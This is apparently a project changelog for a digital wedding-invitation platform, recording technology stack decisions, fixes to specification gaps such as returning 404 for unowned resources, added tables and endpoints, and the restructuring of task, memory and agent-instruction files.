**Decided** — the technology stack ([P0-01](./records/2026-09-09-P0-01-stack-decision.md), ADR-004 through ADR-017)
- TypeScript on Node 22 with NestJS; pnpm + Turborepo monorepo; Next.js for the app and the public invitation, Vite for admin; Drizzle ORM; Zod as the single validation vocabulary; BullMQ on Redis; sharp with ClamAV in an isolated worker.
- Cloudflare R2 for object storage with Cloudflare CDN, DNS and Turnstile at the edge; Midtrans for payments; Resend for transactional email; MapLibre in the editor with no map SDK at all on the public page; a single VPS running Docker Compose behind Caddy.
- Vitest, Testcontainers and Playwright for tests; GitHub Actions, Semgrep and OWASP ZAP for CI; Pino, OpenTelemetry, Prometheus and Sentry for observability.
- Six open questions closed (`OQ-01`, `OQ-02`, `OQ-03`, `OQ-04`, `OQ-06`, `OQ-09`). Blocked tasks dropped from seven to two — only pricing (`OQ-05`) and the domain name (`OQ-08`) remain, and both are answers only the project owner can give.

**Changed** — all 17 specification gaps resolved, `docs/` amended ([record](./records/2026-09-09-specification-gap-remediation.md), ADR-018 through ADR-022)
- **The two contradictions.** A resource that exists but is not yours now returns **404** everywhere, never 403 — `docs/API/00` had documented both, and a differentiating status code is an enumeration oracle (ADR-018). A **refund returns the invitation to `draft`**, not `paid` — `docs/PLAN/02` and `docs/BACKEND/05` disagreed, and the difference was whether a refunded customer keeps the ability to republish for free (ADR-019).
- **Five tables added** (ADR-020): `user_tokens`, `user_mfa_factors`, `user_recovery_codes`, `invitation_preview_tokens`, `invitation_view_counts`, `slug_blocklist` — every credential-shaped value stored hashed or encrypted. Two new files: `docs/DATABASE/11-ANALYTICS.md` and `docs/DATABASE/12-PLATFORM-CONFIG.md`.
- **Six endpoints added** (ADR-021): single-media read, owner-side RSVP management with CSV export, owner-side guestbook moderation, template version upgrade, the public watermark flag, and a guest report endpoint that gives the admin moderation queue an actual source.
- **Five documentation corrections** (ADR-022): where settings fields physically live, addon availability at MVP, who performs the `pending_payment` transition, where demo data lives, and three tables `docs/ARCHITECTURE/04` listed that do not exist.
- `docs/PLAN/18-RISK-REGISTER.md` gained **R13** (one vendor carries storage, CDN, DNS and CAPTCHA) and **R14** (single-host deployment, no redundancy at MVP), both consequences of the hosting decision rather than oversights.
- `docs/` grew from 121 to 123 files; 24 documents were amended.

### 2026-09-09 — earlier

**Added** — the execution layer ([P0-24](./records/2026-09-09-P0-24-tasks-and-memory-scaffolding.md), [ADR-003](./DECISIONS.md))
- `TASKS/` — task conventions with an 11-item global Definition of Done, eight phase files covering **133 tasks**, a progress board, and a backlog. Every task names the specification documents it implements, its dependencies, and — where relevant — the abuse cases it must have automated tests for.
- Phase boundaries follow `docs/PLAN/16-IMPLEMENTATION-ROADMAP.md` exactly, so the plan and the roadmap cannot drift. The roadmap's two prose-stated critical dependencies are now encoded as task dependencies: the template system before editor work (`P0-20`, `P0-21` → `P1-22`, `P1-23`), and the payment security review before production (`P3-16`).
- The tenant-scoped repository layer became a Phase 0 task (`P0-11`) rather than an implicit expectation of Phase 1, so that `docs/SECURITY/05`'s zero-tolerance rule is a property of the data layer instead of a review checklist.

**Changed** — the record layer ([P0-24](./records/2026-09-09-P0-24-tasks-and-memory-scaffolding.md))
- `MEMORY/` restructured to the record format: `MEMORY-INDEX.md`, `CHANGELOG.md`, `DECISIONS.md`, `records/`, `specs/`, `templates/`.
- `MEMORY/LOG/` → `MEMORY/records/`, existing entry migrated unchanged.
- `MEMORY/STATE.md` **removed**; `TASKS/PROGRESS.md` is now the single status board. Two snapshots drift, and then neither is trusted.
- `MEMORY/DECISIONS.md` rewritten in ADR format. The two existing decisions are preserved as ADR-001 (single canonical documentation language) and ADR-002 (stack not yet chosen); ADR-003 records the establishment of `TASKS/` and `MEMORY/`; a pending-decisions table lists the 16 decisions `TASKS/` expects to need.
- `CLAUDE.md` and `AGENTS.md` amended: their MEMORY sections describe the new structure, and their documentation maps and workflows now include `TASKS/`. They previously instructed agents to write to `MEMORY/STATE.md` and `MEMORY/LOG/`, which no longer exist.

**Found** — while writing the plan against the specification ([`TASKS/BACKLOG.md`](../TASKS/BACKLOG.md))
- **Two contradictions between documents**, both of which would have become bugs:
  - `PG-01` — `docs/API/00-API-STANDARDS.md` documents *both* 403 and 404 for "the resource exists but is not yours", while `docs/SECURITY/04`, `docs/SECURITY/05`, `docs/TESTING/04` and `CLAUDE.md` all require 404. `docs/API/05` then specifies 403 for that case.
  - `PG-14` — a refund sends the invitation to `draft` per `docs/PLAN/02` BR-5.4 and to `paid` per `docs/BACKEND/05` § Refund. The difference decides whether a refunded customer keeps the ability to republish for free.
- **Fifteen further specification gaps**, most of them a table or endpoint the specification requires functionally but never models: verification and reset tokens (`PG-06`), share-preview tokens (`PG-04`), page view counts (`PG-12`), admin 2FA factors (`PG-13`), the slug blocklist (`PG-15`), owner-side RSVP endpoints (`PG-10`), owner-side guestbook moderation (`PG-11`), a single-media read endpoint the frontend polls (`PG-03`), and the watermark flag the public renderer needs but never receives (`PG-09`).
- **Thirteen open questions** needing a decision from the project owner — stack, payment provider, hosting, email provider, pricing, maps provider, domain, CAPTCHA vendor, encryption at rest, account deletion semantics, team size, watermark design, and the language of these two folders. Seven block a specific task; `OQ-01` blocks all of Phase 0.
- **Fourteen `docs/` amendments** are now owed by the tasks that resolve these gaps, tracked in `TASKS/PROGRESS.md` § Specification Amendments Owed.

### 2026-09-09 — earlier

**Added** — the specification ([record](./records/2026-09-09-documentation-set-and-agent-instructions.md))
- `docs/` — 121 documents across PLAN, ARCHITECTURE, API, DATABASE, SECURITY, UI-UX, FRONTEND, BACKEND, DEVOPS and TESTING, expanded from a rough outline into full content: SQL schemas with real types and constraints, endpoint contracts with request and response examples, the template section and theme schema, the invitation lifecycle state machine, a STRIDE threat model, and a per-layer test strategy.
- `CLAUDE.md` and `AGENTS.md` — agent operating instructions, including the non-negotiable rules that govern implementation: templates are data not code, invitation data is independent of the template, object-level authorization on every `:id` endpoint, payment status server-decided only, prices recalculated server-side, all free text sanitized, uploads through the full validation pipeline, state transitions logged.
- `MEMORY/` — initialized with a state snapshot, a decision log and the first log entry.

**Changed**
- The Indonesian `docs/` was deleted and `docs-en/` renamed to `docs/`, leaving one canonical English documentation set ([ADR-001](./DECISIONS.md)). User-facing product copy remains Bahasa Indonesia.
